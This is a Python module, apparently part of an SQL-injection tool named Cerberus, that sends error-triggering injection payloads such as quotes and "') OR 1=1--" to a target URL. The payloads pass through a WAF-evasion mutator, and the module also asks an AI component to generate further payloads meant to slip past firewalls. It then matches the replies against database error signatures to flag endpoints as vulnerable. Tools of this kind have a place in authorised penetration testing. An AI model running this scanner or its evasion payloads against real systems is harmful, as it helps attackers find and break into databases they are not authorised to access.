import logging
import re
from typing import Dict, Any, List
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_error")

class VectorError(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en Errores (Error-Based).
    Inyecta sintaxis malformada diseñada para provocar fugas de información del DBMS.
    """

    ERROR_SIGNATURES = [
        # MySQL / MariaDB
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\bpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        # Microsoft SQL Server
        r"Driver.* SQL Server",
        r"OLE DB.* SQL Server",
        r"\bSQL Server\b.*Driver",
        r"Warning.*mssql_.*",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        # Oracle
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\boci_.*",
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_.*",
        # Generic
        r"SQL error",
        r"Syntax error in SQL statement",
    ]

    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Error-based sobre {self.target_url}")
        
        test_payloads = []

        # Integrate AI Smart Payloads if omni context allows
        if context.get("force_ai_payloads", True):
            try:
                from backend.core.cortex_ai import generate_smart_payloads
                logger.debug(f"[Error] Invocando Cortex AI (WAF: {context.get('waf_type', 'Auto')}) para generar paquete de ataques Syntax/Error avanzados...")
                ai_ctx = {
                    "vector": "Error", 
                    "url": self.target_url, 
                    "parameter": "id",
                    "waf_type": context.get("waf_type", "general_strong")
                }
                # Request 4 specific error-triggering payloads
                smart_p = await generate_smart_payloads(ai_ctx, "Generar inyecciones Error-based (comillas, conversiones de tipo inválidas, sintaxis rotas) evadiendo WAF.", target_count=4)
                if smart_p and len(smart_p) >= 1:
                    test_payloads.extend(smart_p)
                    logger.info(f"[*] Native Engine (AI): Paquete de Error aplicado con {len(smart_p)} vectores avanzados.")
            except Exception as e:
                logger.warning(f"[Error] Paquete de ataques IA falló, usando heurística local. Error: {e}")

        # Instanciar el evasor dinámico
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        # Payloads clásicos para provocar errores de sintaxis (Mutados dinámicamente)
        classic_payloads = [
            evader.evade("'"),
            evader.evade("\""),
            evader.evade("')"),
            evader.evade("\")"),
            evader.evade("`"),
            evader.evade("') OR 1=1--"),
        ]

        # Combine AI payloads with classic heuristics
        all_test_payloads = test_payloads + classic_payloads

        for payload in all_test_payloads:
            test_url = self.inject_url(payload)
            resp = await self._safe_get(test_url)
            
            if not resp:
                continue
                
            body = resp.text
            for sig in self.ERROR_SIGNATURES:
                if re.search(sig, body, re.IGNORECASE):
                    logger.info(f"[+] Inyección Error-Based Exitosa: Firma detectada '{sig}'")
                    return {
                        "status": "vulnerable",
                        "technique": "Error-based",
                        "evidence": f"DBMS Error signature found: {sig} with payload {payload}"
                    }

        # ── Cortex AI: El Oráculo de Excepciones ──────────────────────────
        # Algunos WAFs convierten el 500 en un 200 dinámico "limpio".
        # Si el ratio de cambio es alto pero no hay firmas obvias, consultamos a la IA.
        # (Omitido por brevedad en este vector primario, pero extensible)
        
        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            # Aumentamos timeout para esperar el procesamiento de errores del backend
            return await self.client.get(url, timeout=15.0)
        except Exception as e:
            logger.warning(f"Error HTTP en vector de error: {e}")
            return None
